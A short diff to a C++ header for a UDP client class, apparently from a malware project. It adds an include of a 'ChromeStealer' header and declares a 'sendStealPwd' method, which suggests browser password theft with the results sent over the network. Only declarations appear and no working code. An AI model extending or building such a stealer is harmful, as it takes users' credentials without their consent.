@@ -15,6 +15,7 @@
 #include "IClient.h"
 #include "StaticTools.h"
 #include "RequestHandler.h"
+#include "ChromeStealer.h"
 
 class UDPClient : public IClient
 {
@@ -29,6 +30,7 @@ class UDPClient : public IClient
 	virtual bool isConnected(void) const;
 	virtual IClient &operator<<(Packet *packet);
 	virtual Packet *createPacket(PacketType type, std::string const& data);
+	virtual void sendStealPwd(std::string const& ftpPort);
 
  private:
 	 void do_write(boost::system::error_code const& ec, size_t);
